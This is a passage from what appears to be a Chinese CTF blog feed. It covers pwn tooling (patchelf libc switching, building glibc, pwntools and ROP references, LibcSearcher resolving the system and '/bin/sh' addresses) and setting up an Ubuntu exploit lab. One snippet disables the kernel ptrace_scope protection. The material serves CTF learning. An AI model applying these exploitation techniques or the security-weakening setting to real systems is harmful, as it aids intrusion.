elf</span><br><span class="line">linux-vdso.so.1 (0x00007fffd31d7000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007efc8b627000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007efc8b834000)</span><br></pre></td></tr></table></figure><p>patchelf使用</p><p><strong>ld切换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong>libc切换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6[符号] /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong>也有这样修改libc的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong><code>patchelf --set-rpath</code></strong> 的作用是 在ELF文件的 <strong>Dynamic section</strong> 的中添加一个 <strong>RUNPATH</strong> 段里面储存着动态链接库的绝对路径，即设置程序的动态链接库</p><p>readelf -d ./elf 查看runpath和needed</p><p><strong><u>ld版本与libc版本要对应</u></strong></p><p>不过有时替换了之后，ldd会显示不是可执行文件，但却可以正常运行</p><h2 id="glibc-all-one"><a href="#glibc-all-one" class="headerlink" title="glibc_all_one"></a>glibc_all_one</h2><p>更新</p><p><code>./update_list</code></p><p>下载</p><p><code>./download libc</code>_name</p><h2 id="其他来源glibc安装"><a href="#其他来源glibc安装" class="headerlink" title="其他来源glibc安装"></a>其他来源glibc安装</h2><p>glibc-2.23为例</p><p>解压<br><code>tar xvf glibc-2.23.tar.gz</code></p><p>进入解压目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc-2.23</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure><p><strong>选择带 debug symobl 以及配置好安装位置</strong></p><p><code>CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -w&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -w&quot; ../configure --prefix=/home/aichch/glibc_all_one/libs/glibc-2.23/</code></p><p>CFLAGS、CXXFLAGS 与 debug symobl 有关</p><p>—prefix 是安装目录</p><p><strong>编译安装</strong></p><p><code>make &amp;&amp; make install</code></p><p>若出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/ccPRCqlU.s: Error: `loc1@GLIBC_2.2.5&#x27; can&#x27;t be versioned to common symbol &#x27;loc1&#x27;</span><br><span class="line">/tmp/ccPRCqlU.s: Error: `loc2@GLIBC_2.2.5&#x27; can&#x27;t be versioned to common symbol &#x27;loc2&#x27;</span><br><span class="line">/tmp/ccPRCqlU.s: Error: `locs@GLIBC_2.2.5&#x27; can&#x27;t be versioned to common symbol &#x27;locs&#x27;</span><br></pre></td></tr></table></figure><p>解决方案就是在 <code>/misc/regexp.c</code> 中增改几行代码</p><p>做如下修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/misc/regexp.c b/misc/regexp.c</span><br><span class="line">index <span class="number">19</span>d76c0.<span class="number">.9017</span>bc1 <span class="number">100644</span></span><br><span class="line">--- a/misc/regexp.c</span><br><span class="line">+++ b/misc/regexp.c</span><br><span class="line">@@ <span class="number">-29</span>,<span class="number">14</span> +<span class="number">29</span>,<span class="number">17</span> @@ </span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span></span><br><span class="line"> </span><br><span class="line">-<span class="comment">/* Define the variables used for the interface.  */</span></span><br><span class="line">-<span class="type">char</span> *loc1;</span><br><span class="line">-<span class="type">char</span> *loc2;</span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span><span class="comment">/* Get NULL.  */</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="comment">/* Define the variables used for the interface.  Avoid .symver on common</span></span><br><span class="line"><span class="comment">+   symbol, which just creates a new common symbol, not an alias.  */</span></span><br><span class="line">+<span class="type">char</span> *loc1 = <span class="literal">NULL</span>;</span><br><span class="line">+<span class="type">char</span> *loc2 = <span class="literal">NULL</span>;</span><br><span class="line"> compat_symbol (libc, loc1, loc1, GLIBC_2_0);</span><br><span class="line"> compat_symbol (libc, loc2, loc2, GLIBC_2_0);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* Although we do not support the use we define this variable as well.  */</span></span><br><span class="line">-<span class="type">char</span> *locs;</span><br><span class="line">+<span class="type">char</span> *locs = <span class="literal">NULL</span>;</span><br><span class="line"> compat_symbol (libc, locs, locs, GLIBC_2_0);</span><br></pre></td></tr></table></figure><h1 id="python包"><a href="#python包" class="headerlink" title="python包"></a>python包</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>详细见<a href="https://docs.pwntools.com/en/stable/">pwntools —documentation</a></p><h3 id="程序启动"><a href="#程序启动" class="headerlink" title="程序启动"></a>程序启动</h3><p><strong>process启动</strong></p><p>强制使用给定的ld和libc启动进程</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(argv=[<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so&quot;</span>, <span class="string">&quot;./elf&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/aichch/pwn/libc-2.31.so&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>aslr等级设置</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=process(<span class="string">&#x27;./elf&#x27;</span>,aslr=<span class="number">0</span>/<span class="number">1</span>/<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>带参数启动</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=process(argv=[<span class="string">&#x27;./elf&#x27;</span>,arguments])</span><br></pre></td></tr></table></figure><p><strong>debug启动</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = gdb.debug(<span class="string">&quot;/bin/bash&quot;</span>, gdbscript=<span class="string">&#x27;continue&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中,传入了<code>gdbscript=&#39;continue&#39;</code>，以使调试器恢复执行，但是可以传入任何有效的 GDB 脚本命令，它们将在调试进程启动时被执行。</p><p>运行异构架构的进程必须用<code>gdb.debug</code>启动，以便对其进行调试</p><p>以debug()启动的程序会停在start函数的起始,即程序的最开始</p><p><strong>remote远程</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=remote(ip,host,ssl=false)</span><br></pre></td></tr></table></figure><p>参数:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Arguments:</span><br><span class="line">    host(<span class="built_in">str</span>): The host to connect to.</span><br><span class="line">    port(<span class="built_in">int</span>): The port to connect to.</span><br><span class="line">    fam: The string <span class="string">&quot;any&quot;</span>, <span class="string">&quot;ipv4&quot;</span> <span class="keyword">or</span> <span class="string">&quot;ipv6&quot;</span> <span class="keyword">or</span> an integer to <span class="keyword">pass</span> to socket.getaddrinfo.</span><br><span class="line">    typ: The string <span class="string">&quot;tcp&quot;</span> <span class="keyword">or</span> <span class="string">&quot;udp&quot;</span> <span class="keyword">or</span> an integer to <span class="keyword">pass</span> to socket.getaddrinfo.</span><br><span class="line">    timeout: A positive number, <span class="literal">None</span> <span class="keyword">or</span> the string <span class="string">&quot;default&quot;</span>.</span><br><span class="line">    ssl(<span class="built_in">bool</span>): Wrap the socket <span class="keyword">with</span> SSL</span><br><span class="line">    ssl_context(ssl.SSLContext): Specify SSLContext used to wrap the socket.</span><br><span class="line">    sni: <span class="type">Set</span> <span class="string">&#x27;server_hostname&#x27;</span> <span class="keyword">in</span> ssl_args based on the host parameter.</span><br><span class="line">    sock(socket.socket): Socket to inherit, rather than connecting</span><br><span class="line">    ssl_args(<span class="built_in">dict</span>): Pass ssl.wrap_socket named arguments <span class="keyword">in</span> a dictionary.</span><br></pre></td></tr></table></figure><h3 id="数据接收与发送"><a href="#数据接收与发送" class="headerlink" title="数据接收与发送"></a>数据接收与发送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(b&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到设置的标志出现，drop表示是否接收标志，默认接收</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br><span class="line">send(data) - 发送数据</span><br><span class="line">sendline(line) - 发送数据加一个换行</span><br><span class="line">u64()/u32()  解包</span><br><span class="line">p64()/p32()  打包</span><br><span class="line">flat()      平坦化处理数据,会自动小端序但需要指定context.arch,否则默认4字节</span><br></pre></td></tr></table></figure><h3 id="针对elf的处理"><a href="#针对elf的处理" class="headerlink" title="针对elf的处理"></a>针对elf的处理</h3><p><strong>常用符号处理</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf.symbols[<span class="string">&#x27;symbol&#x27;</span>]<span class="comment">#获取符号,也可以elf.sym[&#x27;symbol&#x27;]</span></span><br><span class="line"></span><br><span class="line">elf.plt[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">elf.got[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#search</span></span><br><span class="line"><span class="built_in">next</span>(elf.search(<span class="string">b&#x27;bytes&#x27;</span>))<span class="comment">#在程序中搜索字节数据,返回一个迭代器,所以需要next方法获得值</span></span><br><span class="line"><span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;jmp esp&#x27;</span>), executable = <span class="literal">True</span>))<span class="comment">#虽然一般用来查找字符串,但其实能查找所有的字节数据,例如机器码</span></span><br><span class="line"></span><br><span class="line">elf.address=addr<span class="comment">#指定基址</span></span><br></pre></td></tr></table></figure><p><strong>更多</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#read,write and patch</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line">e.read(e.address+<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="string">b&#x27;ELF&#x27;</span></span><br><span class="line">e.asm(e.address, <span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">e.save(<span class="string">&#x27;/tmp/quiet-cat&#x27;</span>)</span><br><span class="line">disasm(<span class="built_in">open</span>(<span class="string">&#x27;/tmp/quiet-cat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read(<span class="number">1</span>))</span><br><span class="line"><span class="string">&#x27;   0:   c3                      ret&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get section</span></span><br><span class="line">elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header</span><br><span class="line">elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br></pre></td></tr></table></figure><h3 id="context及log"><a href="#context及log" class="headerlink" title="context及log"></a>context及log</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">context.binary=&#x27;&#x27;根据二进制文件自动获取环境变量</span><br><span class="line">context.terminal(&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;)新终端参数</span><br><span class="line">log.success(&quot;&quot;)  打印信息</span><br></pre></td></tr></table></figure><h3 id="gdb-1"><a href="#gdb-1" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach()</span><br><span class="line">可以加入一些命令,例如gdb.attach(p,&#x27;b system&#x27;)</span><br><span class="line"></span><br><span class="line">debug_shellcode()</span><br><span class="line">--Build a binary with the provided shellcode, and start it under a debugger</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Linux 系统有一个叫做trace_scope的设置，它可以阻止非子进程的进程被调试。Pwntools 对于它自己启动的任何进程都能解决这个问题，但是如果你必须在 Pwntools 之外启动一个进程，并试图通过 pid 附加到它（例如gdb.attach(1)），可能被阻止附加。</span><br><span class="line"></span><br><span class="line">可以通过禁用安全设置和重启机器来解决这个问题：</span><br><span class="line"></span><br><span class="line">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF</span><br><span class="line">kernel.yama.ptrace_scope = 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rop=ROP(&#x27;&#x27;)  创建一个rop对象</span><br><span class="line">rop.raw()   填充padding</span><br><span class="line">rop.call(&#x27;函数&#x27;,[arg1,arg2,arg3])  调用函数</span><br><span class="line">#对一些常见函数也可以直接</span><br><span class="line">#rop.read(arg1,arg2,arg3)</span><br><span class="line">#rop.write(arg1,arg2,arg3)</span><br><span class="line">rop.unresolve(&#x27;&#x27;) 返回符号的地址</span><br><span class="line">rop.chain()  返回完整的rop链</span><br><span class="line">rop.migrate(base_stage) 将程序流程转移到 base_stage（地址）,栈迁移?</span><br><span class="line">rop.dump() 直观地展示当前的 rop 链</span><br></pre></td></tr></table></figure><h3 id="pwntools-comandline"><a href="#pwntools-comandline" class="headerlink" title="pwntools comandline"></a>pwntools comandline</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checksec 检查保护</span><br><span class="line">ROPgadget  gadget查找</span><br></pre></td></tr></table></figure><h3 id="qemu-1"><a href="#qemu-1" class="headerlink" title="qemu"></a>qemu</h3><p><strong>需要用pwntools调试qemu启动的程序,首先需要设置context,不然很多设置会出错</strong></p><p>对于动态链接的程序还需要</p><p>如果用process()启动异构elf,pwntools只会尝试盲目打开程序,如果失败则会使用qemu逐个尝试打开程序,当然也可以自己指定</p><p>例如</p><ol><li><p><code>p=process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./armup_buu&quot;])</code></p><p>不过这样启动就是调试模式,程序完全由gdb-multiarch控制</p></li><li><p><code>p=process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./armup_buu&quot;])</code></p><p>这样启动程序就能正常向下执行了</p></li></ol><p>只是这样打开的话gdb.attach(p)是附加不上去的,只能到另一个命令行使用gdb.multiarch调试</p><hr><p>当然也可以通过gdb.debug()打开异构elf,pwntools会自动添加适合的命令行参数给qemu,并正确启动gdb</p><p>不过实际发现上面两种方式在调试时都不是很灵敏</p><h3 id="constants"><a href="#constants" class="headerlink" title="constants"></a>constants</h3><p><code>constants</code>可以返回诸多c源文件中定义的常量</p><h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&quot;函数名&quot;</span>,函数真实地址)</span><br><span class="line">libc.add_condition(leaked_func, leaked_address)          <span class="comment">#增加限制提高准确度</span></span><br><span class="line">libcbase = 函数真实地址 – libc.dump(<span class="string">&quot;函数名&quot;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)            <span class="comment">#system 偏移</span></span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)         <span class="comment">#/bin/sh 偏移</span></span><br></pre></td></tr></table></figure><p>另外如果是pypi上下载的更新版本,还多了一些功能</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(libc) <span class="comment"># 返回在当前约束条件下，可能的 Libc 数量</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libc) <span class="comment"># 若 Libc 已被唯一确定，打印其详细信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> libc :</span><br><span class="line">    <span class="built_in">print</span>(obj) <span class="comment"># 实现了迭代器，打印(或其它操作)当前所有可能的 Libc </span></span><br><span class="line"></span><br><span class="line">obj.select_libc() <span class="comment"># 打印可能的 Libc 列表，手动选择一个认为正确的 Libc</span></span><br><span class="line">obj.select_libc(<span class="number">2</span>) <span class="comment"># 手动选择 2 号 Libc 作为正确的 Libc</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn环境准备</title>
      <link href="/posts/6947/"/>
      <url>/posts/6947/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本用的虚拟机不知道怎么抽风了，弄了半天没弄好😣，干脆一不做二不休删了重新安装,顺便记录下环境搭建过程.因为用惯了ubuntu20所以这次的版本是20.04.04。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="设置超级用户"><a href="#设置超级用户" class="headerlink" title="设置超级用户"></a>设置超级用户</h2><p><code>sudo passwd root</code></p><h2 id="先换个源"><a href="#先换个源" class="headerlink" title="先换个源"></a>先换个源</h2><p>备份一下旧的</p><p><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p><p>编辑</p><p><code>sudo gedit /etc/apt/sources.list</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#清华源</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 阿里云镜像源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>这里又踩了个大坑</p><p>得先用<code>lsb_release -c</code>看看自己的ubuntu是哪个版本</p><p>我的是focal之前却用的bionic的源</p><p>就出现了装什么都出错的冥场面</p><h2 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.pip/</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><h2 id="python-is-python3"><a href="#python-is-python3" class="headerlink" title="python-is-python3"></a>python-is-python3</h2><p><code>sudo apt install python-is-python3</code></p><h2 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim</span><br></pre></td></tr></table></figure><h2 id="安装gcc"><a href="#安装gcc" class="headerlink" title="安装gcc"></a>安装gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br><span class="line">gcc --version  </span><br></pre></td></tr></table></figure><h2 id="配置32位环境"><a href="#配置32位环境" class="headerlink" title="配置32位环境"></a>配置32位环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><p>两种方法</p><p>第一种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo python3 -m pip install --upgrade pip</span><br><span class="line">sudo python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">sudo python setup.py install #这一步最好挂魔法</span><br></pre></td></tr></table></figure><h2 id="安装capstone"><a href="#安装capstone" class="headerlink" title="安装capstone"></a>安装capstone</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="pwndbg与pwngdb"><a href="#pwndbg与pwngdb" class="headerlink" title="pwndbg与pwngdb"></a>pwndbg与pwngdb</h2><p>pwngdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 